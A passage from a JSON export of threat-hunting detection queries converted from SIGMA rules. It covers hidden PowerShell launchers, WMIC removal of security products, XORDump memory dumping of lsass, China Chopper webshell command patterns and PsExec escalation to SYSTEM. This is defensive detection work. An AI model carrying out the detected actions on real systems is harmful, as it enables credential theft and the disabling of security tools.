            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"-Sta\" and tgt.process.cmdline contains \"-Nop\" and tgt.process.cmdline contains \"-Window\" and tgt.process.cmdline contains \"Hidden\") and (tgt.process.cmdline contains \"-Command\" or tgt.process.cmdline contains \"-EncodedCommand\")) or (tgt.process.cmdline contains \"sv o (New-Object IO.MemorySteam);sv d \" or tgt.process.cmdline contains \"mshta file.hta\" or tgt.process.cmdline contains \"GruntHTTP\" or tgt.process.cmdline contains \"-EncodedCommand cwB2ACAAbwAgA\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 397
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uninstallation or termination of security products using the WMIC utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Potential Tampering With Security Products Via WMIC",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"wmic\" and tgt.process.cmdline contains \"product where \" and tgt.process.cmdline contains \"call\" and tgt.process.cmdline contains \"uninstall\" and tgt.process.cmdline contains \"/nointeractive\") or ((tgt.process.cmdline contains \"wmic\" and tgt.process.cmdline contains \"caption like \") and (tgt.process.cmdline contains \"call delete\" or tgt.process.cmdline contains \"call terminate\")) or (tgt.process.cmdline contains \"process \" and tgt.process.cmdline contains \"where \" and tgt.process.cmdline contains \"delete\")) and (tgt.process.cmdline contains \"%carbon%\" or tgt.process.cmdline contains \"%cylance%\" or tgt.process.cmdline contains \"%endpoint%\" or tgt.process.cmdline contains \"%eset%\" or tgt.process.cmdline contains \"%malware%\" or tgt.process.cmdline contains \"%Sophos%\" or tgt.process.cmdline contains \"%symantec%\" or tgt.process.cmdline contains \"Antivirus\" or tgt.process.cmdline contains \"AVG \" or tgt.process.cmdline contains \"Carbon Black\" or tgt.process.cmdline contains \"CarbonBlack\" or tgt.process.cmdline contains \"Cb Defense Sensor 64-bit\" or tgt.process.cmdline contains \"Crowdstrike Sensor\" or tgt.process.cmdline contains \"Cylance \" or tgt.process.cmdline contains \"Dell Threat Defense\" or tgt.process.cmdline contains \"DLP Endpoint\" or tgt.process.cmdline contains \"Endpoint Detection\" or tgt.process.cmdline contains \"Endpoint Protection\" or tgt.process.cmdline contains \"Endpoint Security\" or tgt.process.cmdline contains \"Endpoint Sensor\" or tgt.process.cmdline contains \"ESET File Security\" or tgt.process.cmdline contains \"LogRhythm System Monitor Service\" or tgt.process.cmdline contains \"Malwarebytes\" or tgt.process.cmdline contains \"McAfee Agent\" or tgt.process.cmdline contains \"Microsoft Security Client\" or tgt.process.cmdline contains \"Sophos Anti-Virus\" or tgt.process.cmdline contains \"Sophos AutoUpdate\" or tgt.process.cmdline contains \"Sophos Credential Store\" or tgt.process.cmdline contains \"Sophos Management Console\" or tgt.process.cmdline contains \"Sophos Management Database\" or tgt.process.cmdline contains \"Sophos Management Server\" or tgt.process.cmdline contains \"Sophos Remote Management System\" or tgt.process.cmdline contains \"Sophos Update Manager\" or tgt.process.cmdline contains \"Threat Protection\" or tgt.process.cmdline contains \"VirusScan\" or tgt.process.cmdline contains \"Webroot SecureAnywhere\" or tgt.process.cmdline contains \"Windows Defender\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 398
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious use of XORDump process memory dumping utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "HackTool - XORDump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\xordump.exe\" or (tgt.process.cmdline contains \" -process lsass.exe \" or tgt.process.cmdline contains \" -m comsvcs \" or tgt.process.cmdline contains \" -m dbghelp \" or tgt.process.cmdline contains \" -m dbgcore \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 399
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1018",
                "t1033",
                "t1087"
            ],
            "name": "Chopper Webshell Process Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\w3wp.exe\") and (tgt.process.cmdline contains \"&ipconfig&echo\" or tgt.process.cmdline contains \"&quser&echo\" or tgt.process.cmdline contains \"&whoami&echo\" or tgt.process.cmdline contains \"&c:&echo\" or tgt.process.cmdline contains \"&cd&echo\" or tgt.process.cmdline contains \"&dir&echo\" or tgt.process.cmdline contains \"&echo [E]\" or tgt.process.cmdline contains \"&echo [S]\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 400
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1569"
            ],
            "name": "PUA - RunXCmd Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" /account=system \" or tgt.process.cmdline contains \" /account=ti \") and tgt.process.cmdline contains \"/exec=\")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 401
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to \"SyncInvoke\" that is part of the \"CL_Invocation.ps1\" script to proxy execution using \"System.Diagnostics.Process\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Potential Process Execution Proxy Via CL_Invocation.ps1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"SyncInvoke \")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 402
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Compress target file into a cab file stored in the Alternate Data Stream (ADS) of the target file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Suspicious Diantz Alternate Data Stream Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"diantz.exe\" and tgt.process.cmdline contains \".cab\") and tgt.process.cmdline matches \":[^\\\\\\\\]\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 403
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the \"ms-appinstaller\" protocol handler via command line to potentially download arbitrary files via AppInstaller.EXE\nThe downloaded files are temporarly stored in \":\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential File Download Via MS-AppInstaller Protocol Handler",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*ms-appinstaller://*source=*\" and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 404
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Schtasks Creation Or Modification With SYSTEM Privileges",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /change \" or tgt.process.cmdline contains \" /create \")) and tgt.process.cmdline contains \"/ru \" and (tgt.process.cmdline contains \"NT AUT\" or tgt.process.cmdline contains \" SYSTEM \")) and (not ((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/TN TVInstallRestore\" and tgt.process.cmdline contains \"\\TeamViewer_.exe\")) or (tgt.process.cmdline contains \"Subscription Heartbeat\" and tgt.process.cmdline contains \"\\HeartbeatConfig.xml\" and tgt.process.cmdline contains \"\\Microsoft Shared\\OFFICE\") or (tgt.process.cmdline contains \"/Create /F /RU System /SC WEEKLY /TN AviraSystemSpeedupVerify /TR \" or tgt.process.cmdline contains \":\\Program Files (x86)\\Avira\\System Speedup\\setup\\avira_speedup_setup.exe\" or tgt.process.cmdline contains \"/VERIFY /VERYSILENT /NOSTART /NODOTNET /NORESTART\\\" /RL HIGHEST\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 405
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Suspicious GUP Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\GUP.exe\" and (not ((tgt.process.image.path contains \"\\Program Files\\Notepad++\\updater\\GUP.exe\" or tgt.process.image.path contains \"\\Program Files (x86)\\Notepad++\\updater\\GUP.exe\") or (tgt.process.image.path contains \"\\Users\\\" and (tgt.process.image.path contains \"\\AppData\\Local\\Notepad++\\updater\\GUP.exe\" or tgt.process.image.path contains \"\\AppData\\Roaming\\Notepad++\\updater\\GUP.exe\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 406
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated use of stdin to execute PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation STDIN+ Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"cmd.{0,5}(?:/c|/r).+powershell.+(?:\\\\$\\\\{?input\\\\}?|noexit).+\\\\\"\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 407
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587"
            ],
            "name": "PsExec/PAExec Escalation to LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -s cmd\" or tgt.process.cmdline contains \" /s cmd\" or tgt.process.cmdline contains \" \u2013s cmd\" or tgt.process.cmdline contains \" \u2014s cmd\" or tgt.process.cmdline contains \" \u2015s cmd\" or tgt.process.cmdline contains \" -s -i cmd\" or tgt.process.cmdline contains \" -s /i cmd\" or tgt.process.cmdline contains \" -s \u2013i cmd\" or tgt.process.cmdline contains \" -s \u2014i cmd\" or tgt.process.cmdline contains \" -s \u2015i cmd\" or tgt.process.cmdline contains \" /s -i cmd\" or tgt.process.cmdline contains \" /s /i cmd\" or tgt.process.cmdline contains \" /s \u2013i cmd\" or tgt.process.cmdline contains \" /s \u2014i cmd\" or tgt.process.cmdline contains \" /s \u2015i cmd\" or tgt.process.cmdline contains \" \u2013s -i cmd\" or tgt.process.cmdline contains \" \u2013s /i cmd\" or tgt.process.cmdline contains \" \u2013s \u2013i cmd\" or tgt.process.cmdline contains \" \u2013s \u2014i cmd\" or tgt.process.cmdline contains \" \u2013s \u2015i cmd\" or tgt.process.cmdline contains \" \u2014s -i cmd\" or tgt.process.cmdline contains \" \u2014s /i cmd\" or tgt.process.cmdline contains \" \u2014s \u2013i cmd\" or tgt.process.cmdline contains \" \u2014s \u2014i cmd\" or tgt.process.cmdline contains \" \u2014s \u2015i cmd\" or tgt.process.cmdline contains \" \u2015s -i cmd\" or tgt.process.cmdline contains \" \u2015s /i cmd\" or tgt.process.cmdline contains \" \u2015s \u2013i cmd\" or tgt.process.cmdline contains \" \u2015s \u2014i cmd\" or tgt.process.cmdline contains \" \u2015s \u2015i cmd\" or tgt.process.cmdline contains \" -i -s cmd\" or tgt.process.cmdline contains \" -i /s cmd\" or tgt.process.cmdline contains \" -i \u2013s cmd\" or tgt.process.cmdline contains \" -i \u2014s cmd\" or tgt.process.cmdline contains \" -i \u2015s cmd\" or tgt.process.cmdline contains \" /i -s cmd\" or tgt.process.cmdline contains \" /i /s cmd\" or tgt.process.cmdline contains \" /i \u2013s cmd\" or tgt.process.cmdline contains \" /i \u2014s cmd\" or tgt.process.cmdline contains \" /i \u2015s cmd\" or tgt.process.cmdline contains \" \u2013i -s cmd\" or tgt.process.cmdline contains \" \u2013i /s cmd\" or tgt.process.cmdline contains \" \u2013i \u2013s cmd\" or tgt.process.cmdline contains \" \u2013i \u2014s cmd\" or tgt.process.cmdline contains \" \u2013i \u2015s cmd\" or tgt.process.cmdline contains \" \u2014i -s cmd\" or tgt.process.cmdline contains \" \u2014i /s cmd\" or tgt.process.cmdline contains \" \u2014i \u2013s cmd\" or tgt.process.cmdline contains \" \u2014i \u2014s cmd\" or tgt.process.cmdline contains \" \u2014i \u2015s cmd\" or tgt.process.cmdline contains \" \u2015i -s cmd\" or tgt.process.cmdline contains \" \u2015i /s cmd\" or tgt.process.cmdline contains \" \u2015i \u2013s cmd\" or tgt.process.cmdline contains \" \u2015i \u2014s cmd\" or tgt.process.cmdline contains \" \u2015i \u2015s cmd\" or tgt.process.cmdline contains \" -s pwsh\" or tgt.process.cmdline contains \" /s pwsh\" or tgt.process.cmdline contains \" \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015s pwsh\" or tgt.process.cmdline contains \" -s -i pwsh\" or tgt.process.cmdline contains \" -s /i pwsh\" or tgt.process.cmdline contains \" -s \u2013i pwsh\" or tgt.process.cmdline contains \" -s \u2014i pwsh\" or tgt.process.cmdline contains \" -s \u2015i pwsh\" or tgt.process.cmdline contains \" /s -i pwsh\" or tgt.process.cmdline contains \" /s /i pwsh\" or tgt.process.cmdline contains \" /s \u2013i pwsh\" or tgt.process.cmdline contains \" /s \u2014i pwsh\" or tgt.process.cmdline contains \" /s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2013s -i pwsh\" or tgt.process.cmdline contains \" \u2013s /i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2014s -i pwsh\" or tgt.process.cmdline contains \" \u2014s /i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2015s -i pwsh\" or tgt.process.cmdline contains \" \u2015s /i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2015i pwsh\" or tgt.process.cmdline contains \" -i -s pwsh\" or tgt.process.cmdline contains \" -i /s pwsh\" or tgt.process.cmdline contains \" -i \u2013s pwsh\" or tgt.process.cmdline contains \" -i \u2014s pwsh\" or tgt.process.cmdline contains \" -i \u2015s pwsh\" or tgt.process.cmdline contains \" /i -s pwsh\" or tgt.process.cmdline contains \" /i /s pwsh\" or tgt.process.cmdline contains \" /i \u2013s pwsh\" or tgt.process.cmdline contains \" /i \u2014s pwsh\" or tgt.process.cmdline contains \" /i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2013i -s pwsh\" or tgt.process.cmdline contains \" \u2013i /s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2014i -s pwsh\" or tgt.process.cmdline contains \" \u2014i /s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2015i -s pwsh\" or tgt.process.cmdline contains \" \u2015i /s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2015s pwsh\" or tgt.process.cmdline contains \" -s powershell\" or tgt.process.cmdline contains \" /s powershell\" or tgt.process.cmdline contains \" \u2013s powershell\" or tgt.process.cmdline contains \" \u2014s powershell\" or tgt.process.cmdline contains \" \u2015s powershell\" or tgt.process.cmdline contains \" -s -i powershell\" or tgt.process.cmdline contains \" -s /i powershell\" or tgt.process.cmdline contains \" -s \u2013i powershell\" or tgt.process.cmdline contains \" -s \u2014i powershell\" or tgt.process.cmdline contains \" -s \u2015i powershell\" or tgt.process.cmdline contains \" /s -i powershell\" or tgt.process.cmdline contains \" /s /i powershell\" or tgt.process.cmdline contains \" /s \u2013i powershell\" or tgt.process.cmdline contains \" /s \u2014i powershell\" or tgt.process.cmdline contains \" /s \u2015i powershell\" or tgt.process.cmdline contains \" \u2013s -i powershell\" or tgt.process.cmdline contains \" \u2013s /i powershell\" or tgt.process.cmdline contains \" \u2013s \u2013i powershell\" or tgt.process.cmdline contains \" \u2013s \u2014i powershell\" or tgt.process.cmdline contains \" \u2013s \u2015i powershell\" or tgt.process.cmdline contains \" \u2014s -i powershell\" or tgt.process.cmdline contains \" \u2014s /i powershell\" or tgt.process.cmdline contains \" \u2014s \u2013i powershell\" or tgt.process.cmdline contains \" \u2014s \u2014i powershell\" or tgt.process.cmdline contains \" \u2014s \u2015i powershell\" or tgt.process.cmdline contains \" \u2015s -i powershell\" or tgt.process.cmdline contains \" \u2015s /i powershell\" or tgt.process.cmdline contains \" \u2015s \u2013i powershell\" or tgt.process.cmdline contains \" \u2015s \u2014i powershell\" or tgt.process.cmdline contains \" \u2015s \u2015i powershell\" or tgt.process.cmdline contains \" -i -s powershell\" or tgt.process.cmdline contains \" -i /s powershell\" or tgt.process.cmdline contains \" -i \u2013s powershell\" or tgt.process.cmdline contains \" -i \u2014s powershell\" or tgt.process.cmdline contains \" -i \u2015s powershell\" or tgt.process.cmdline contains \" /i -s powershell\" or tgt.process.cmdline contains \" /i /s powershell\" or tgt.process.cmdline contains \" /i \u2013s powershell\" or tgt.process.cmdline contains \" /i \u2014s powershell\" or tgt.process.cmdline contains \" /i \u2015s powershell\" or tgt.process.cmdline contains \" \u2013i -s powershell\" or tgt.process.cmdline contains \" \u2013i /s powershell\" or tgt.process.cmdline contains \" \u2013i \u2013s powershell\" or tgt.process.cmdline contains \" \u2013i \u2014s powershell\" or tgt.process.cmdline contains \" \u2013i \u2015s powershell\" or tgt.process.cmdline contains \" \u2014i -s powershell\" or 